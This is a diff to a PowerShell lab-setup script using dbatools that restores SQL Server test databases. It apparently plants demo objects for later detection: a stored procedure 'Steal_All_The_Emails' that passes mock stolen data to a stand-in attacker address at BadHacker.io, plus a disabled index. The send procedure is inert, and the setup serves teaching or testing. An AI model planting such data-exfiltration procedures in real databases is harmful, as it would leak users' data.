@@ -149,6 +149,35 @@ $containers.ForEach{
 Restore-DbaDatabase -SqlInstance $sql0 -Path $share -useDestinationDefaultDirectories -WithReplace 
 Write-Verbose -Message "Restored Databases on sql0"
 
+$db = Get-DbaDatabase -SqlInstance $sql0-Database AdventureWorks2014
+$db.Query("CREATE PROCEDURE dbo.SendEmailToMe
+-- Add the parameters for the stored procedure here
+@stolen nvarchar(MAX),
+@Email nvarchar(40)
+AS
+BEGIN
+Select @@ServerName
+END
+")
+$db.Query("
+-- =============================================
+-- Author:		Evil Thief
+-- Create date: <A Long Long Time Ago
+-- Description:	Once upon a time there were four little Rabbits, and their names were — Flopsy,Mopsy,Cotton-tail,and Peter.
+-- They lived with their Mother in a sand-bank, underneath the root of a very big fir-tree.
+-- =============================================
+CREATE PROCEDURE dbo.Steal_All_The_Emails
+	
+AS
+BEGIN
+	DECLARE @StoleItAll nvarchar(MAX)= 'All'
+
+	EXEC dbo.SendEmailToMe @stolen = @StoleItAll, @Email = 'IownAllOfYourThings@BadHacker.io'
+
+END
+")
+Write-Verbose -Message "Created stored procedures"
+
 # create folder for backups and empty it if need be
 If (-Not (Test-Path C:\SQLBackups\SQLBackupsForTesting -ErrorAction SilentlyContinue)) {
     New-Item C:\SQLBackups\SQLBackupsForTesting -ItemType Directory
@@ -159,6 +188,16 @@ Write-Verbose -Message "Emptied backup directory"
 # remove databases from sql1 
 Get-DbaDatabase -SqlInstance $sql1 -ExcludeAllSystemDb -ExcludeDatabase WideWorldImporters | Remove-DbaDatabase -Confirm:$False
 Write-Verbose -Message "Removed databases from $SQL1"
+
+$db.Query("CREATE NONCLUSTERED INDEX [IX_Employee_OrganizationLevel_OrganizationNode1] ON [HumanResources].[Employee]
+(
+	[OrganizationLevel] ASC,
+	[OrganizationNode] ASC,
+	[loginid]
+)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, SORT_IN_TEMPDB = OFF, DROP_EXISTING = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
+
+ALTER INDEX [IX_Employee_OrganizationLevel_OrganizationNode1] ON [HumanResources].[Employee] DISABLE
+")
 #endregion
 
 #region Create linked server
